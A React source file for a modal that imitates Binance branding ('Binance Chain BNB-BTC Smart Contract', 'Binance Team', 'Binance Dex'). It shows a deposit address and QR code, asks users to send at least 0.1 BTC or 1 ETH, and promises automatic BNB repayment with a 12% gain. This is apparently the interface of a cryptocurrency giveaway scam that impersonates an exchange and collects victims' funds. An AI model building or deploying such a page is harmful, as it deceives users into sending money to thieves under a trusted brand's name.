import React, { useState } from "react";
import styles from "./ethModal.module.scss";
import { AiOutlineClose } from "react-icons/ai";
import bb from "../../assets/bb.png";
import banner from "../../assets/smart-header-2.jpg";
import { ModalObject } from "../../context/modalContext";
import copy from "clipboard-copy";
import MLoader from "../miniLoader/mLoader";

const EthModal = ({ toggleModalContainer }) => {
  const { toggleModalFunction, config } = ModalObject();
  const [copyAddr, setCopyAddr] = useState(false);
  //   console.log(config);
  const copyToClipboard = () => {
    copy(config.address);
    setCopyAddr(true);
  };
  return (
    <>
      {toggleModalContainer && (
        <div className={styles.parentContainer}>
          <div className={styles.contentContainer}>
            <div className={styles.navbar}>
              <div className={styles.navbarContent}>
                <div className={styles.navLogo}>
                  <div className={styles.navLogoContent}>
                    <img src={bb} alt={bb} />
                  </div>
                  <span>Binance Chain BNB-BTC Smart Contract</span>
                </div>
                <div className={styles.navClose}>
                  <AiOutlineClose
                    onClick={() => {
                      toggleModalFunction();
                    }}
                  />
                </div>
              </div>
            </div>
            <div className={styles.displayBanner}>
              <img src={banner} alt={banner} />
            </div>
            <div className={styles.paymentSection}>
              <div className={styles.paymentSectionContent}>
                <form>
                  <span>The {config.coin} Smart Contract Address:</span>
                  <div className={styles.formGroup}>
                    <input type="text" disabled value={config.address} />
                    <button
                      type="button"
                      onClick={() => {
                        copyToClipboard();
                      }}
                    >
                      {copyAddr ? "copied" : "copy"}
                    </button>
                  </div>
                </form>
              </div>
            </div>
            <div className={styles.qrCodeSection}>
              <div className={styles.qrCodeContent}>
                <img src={config.src} alt={config.src} />
              </div>
            </div>

            <div className={styles.loadingSection}>
              <div className={styles.loadingContent}>
                <span>Waiting to be deposited</span>
                <MLoader />
                <span>
                  Depositing your {config.name} into the smart contract means
                  agreeing to convert {config.name} into Binance Coin (BNB) and
                  send to your wallet immediately
                </span>
              </div>
            </div>
            <div className={styles.instructionSection}>
              <div className={styles.instructionContent}>
                <h3>
                  To use the smart contract, please follow the steps below.
                </h3>
                <ul>
                  <li>
                    {" "}
                    Install any of the wallets mentioned above (Trust wallet,
                    Atomic wallet, and ZenGo wallet)
                  </li>
                  <li>Add Binance (BNB) token to the wallet.</li>
                  <li>
                    Send BTC or ETH to the smart contract address in the wallet.
                  </li>
                  <li>
                    {" "}
                    The minimum sending volume of the BTC smart contract is 0.1
                    BTC, and the minimum sending volume of the ETH smart
                    contract is 1 ETH.
                  </li>
                  <li>
                    {" "}
                    BNB will be automatically deposited into your wallet
                    (including the original value +12% BNB increase in value){" "}
                  </li>
                </ul>
                <div>
                  <span> Thanks for your support!</span>
                  <span> Binance Team</span>
                </div>
              </div>
            </div>

            <div className={styles.footerSection}>
              <div>Binance Dex</div>
            </div>
          </div>
        </div>
      )}
    </>
  );
};

export default EthModal;
